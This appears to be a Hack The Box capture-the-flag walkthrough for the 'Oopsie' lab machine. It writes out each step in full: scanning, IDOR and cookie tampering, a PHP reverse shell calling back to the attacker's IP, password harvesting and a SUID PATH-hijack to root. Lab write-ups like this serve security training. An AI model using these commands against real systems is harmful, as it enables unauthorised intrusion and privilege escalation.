
# Oopsie — HTB Walkthrough

## Introduction

This machine showcases how minor vulnerabilities like Information Disclosure and Broken Access Control can be chained together to achieve full compromise — from web access to root shell.

---

## Enumeration

### Step 1: Scan open ports
```bash
nmap -sC -sV {TARGET_IP}
```
This runs default scripts (`-sC`) and attempts service version detection (`-sV`). It reveals:
- Port 22: SSH
- Port 80: HTTP (automotive web app)

---

## Web Enumeration

### Access the site in browser:
We see an automotive site. The homepage mentions a login system. Let's use Burp Suite to spider hidden routes.

### Burp Passive Spider Setup
1. Set Firefox proxy to `127.0.0.1:8080`.
2. Turn off interception in Burp.
3. Browse the site.
4. Check the *Target → Site Map* tab.

### Result:
We discover `/cdn-cgi/login`, which isn’t linked directly on the homepage.

---

## Authentication Bypass

### Visit `/cdn-cgi/login`:
You’re presented with a login form. Try default creds → fail.

Select “Login as Guest” → now logged in as `guest`. Limited access — but we see `Uploads` tab requires **super admin**.

---

## Cookie Tampering

In Firefox:
- Right-click → Inspect → Storage → Cookies

You’ll see:
```text
user=2233
role=guest
```

We suspect role and user ID control access.

### Test for IDOR:
Visit:
```text
http://{IP}/cdn-cgi/login/admin.php?content=accounts&id=1
```
We get details of a different user — **Information Disclosure via Insecure Direct Object Reference (IDOR)**!

We discover **admin = user ID 34322**

### Modify Cookie:
```text
user=34322
role=admin
```

Refresh page → Now we can access **Uploads**!

---

## Upload Reverse Shell

Use built-in reverse shell:
```bash
cp /usr/share/webshells/php/php-reverse-shell.php .
```

Edit:
```php
$ip = 'YOUR_IP';
$port = 1234;
```

Upload file through the admin panel.

### Brute-force upload location:
```bash
gobuster dir --url http://{TARGET_IP}/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php
```

Found:
```text
/uploads
```

Access your uploaded file:
```bash
http://{TARGET_IP}/uploads/php-reverse-shell.php
```

Set up listener:
```bash
nc -lvnp 1234
```

Reverse shell established! 

### Stabilize shell:
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

---

## Local Enumeration

### Search for credentials:
```bash
cd /var/www/html/cdn-cgi/login
cat * | grep -i passw
```

Result:
```text
Password found: MEGACORP_4dm1n!!
```

### Check users:
```bash
cat /etc/passwd
```

We see a user `robert`.

### Try login:
```bash
su robert
```

Use password `MEGACORP_4dm1n!!` — it works!

### Retrieve user flag:
```bash
cat ~/user.txt
```

---

## Privilege Escalation

### Check group membership:
```bash
id
```

User `robert` belongs to group: `bugtracker`

### Locate files owned by group:
```bash
find / -group bugtracker 2>/dev/null
```

Found:
```bash
/usr/bin/bugtracker
```

### Inspect:
```bash
ls -la /usr/bin/bugtracker
file /usr/bin/bugtracker
```

- SUID set
- ELF binary

### Run it:
```bash
/usr/bin/bugtracker
```

It expects a filename to read with `cat`.

 Hypothesis: It’s running `cat <filename>` without full path → we can hijack it via PATH.

---

## Exploit SUID Path Hijack

### Prepare fake `cat`:
```bash
cd /tmp
echo "/bin/sh" > cat
chmod +x cat
```

### Update $PATH:
```bash
export PATH=/tmp:$PATH
```

### Execute vulnerable binary:
```bash
/usr/bin/bugtracker
```

We get root shell!

### Get root flag:
```bash
cat /root/root.txt
```

---

## Summary

**Exploitation Flow**:
1. Nmap + Web Spidering → Discover Hidden Login
2. Guest Login → Inspect Cookies → IDOR → Cookie Tampering
3. Admin Role Achieved → Upload PHP Reverse Shell
4. Shell → Search Code → Leak Password → Lateral Move to `robert`
5. Find SUID Binary → PATH Hijack → Root!

---

## Mission Accomplished!

```plaintext
USER: robert
USER FLAG: [REDACTED]
ROOT FLAG: [REDACTED]
```
